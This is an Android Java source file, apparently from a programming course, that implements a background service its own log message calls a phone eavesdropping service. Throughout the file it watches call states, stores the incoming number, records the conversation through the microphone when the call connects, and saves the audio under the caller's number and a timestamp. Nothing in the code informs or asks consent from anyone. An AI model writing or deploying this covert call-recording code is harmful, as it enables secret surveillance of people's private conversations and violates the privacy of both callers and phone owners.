package com.m520it.telephonetap;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class telephoneTapService extends Service {

//    private static String mFileName = null;
    private MediaRecorder mRecorder = null;

    public telephoneTapService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.v("-->520it", "telephoneTapService.onBind():13:: " + "电话窃听服务启动了");
        //获取系统电话服务
        TelephonyManager manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        manager.listen(new PhoneStateListener() {

            private String mIcomingNumber="";
            private boolean mIsCalling=false;

            //状态切换的回调
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                switch (state) {
                    //一开始就是空闲状态
                    //接通---->回到空闲状态
                    case TelephonyManager.CALL_STATE_IDLE:
                        Log.v("-->520it", "telephoneTapService.onCallStateChanged():32:: " + "CALL_STATE_IDLE");
                        if (mIsCalling) {
                            stopRecording();
                            mIsCalling=false;
                        }
                        break;
                    //电话打进来,但未接通---->接通
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        Log.v("-->520it", "telephoneTapService.onCallStateChanged():35:: " + "CALL_STATE_OFFHOOK");
                        startRecording(get3GPFilePath(mIcomingNumber));
                        mIsCalling = true;
                        break;
                    //空闲状态---->电话打进来,但未接通
                    case TelephonyManager.CALL_STATE_RINGING:
                        mIcomingNumber=incomingNumber;
                        Log.v("-->520it", "telephoneTapService.onCallStateChanged():38:: " +"CALL_STATE_RINGING" );
                        break;
                }
            }
        },PhoneStateListener.LISTEN_CALL_STATE);
    }

    private String get3GPFilePath(String phoneNumber) {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyMMdd-hh:ss");
        File file = new File(getFilesDir(), phoneNumber+"#"+dateFormat.format(new Date()));
        return file.getAbsolutePath();
    }
    //开始录音
    private void startRecording(String fileName) {

        mRecorder = new MediaRecorder();
        //设置声音来源  MIC 麦克风
        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        //设置输出格式
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        //文件输出路径
        mRecorder.setOutputFile(fileName);
        //设置编码格式
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        try {
            mRecorder.prepare();
        } catch (IOException e) {
            Log.v("-->520it", "telephoneTapService.startRecording():78:: " + "prepare() failed");
        }

        mRecorder.start();
    }
    //录音结束
    private void stopRecording() {
        mRecorder.stop();
        mRecorder.release();
        mRecorder = null;
    }
}
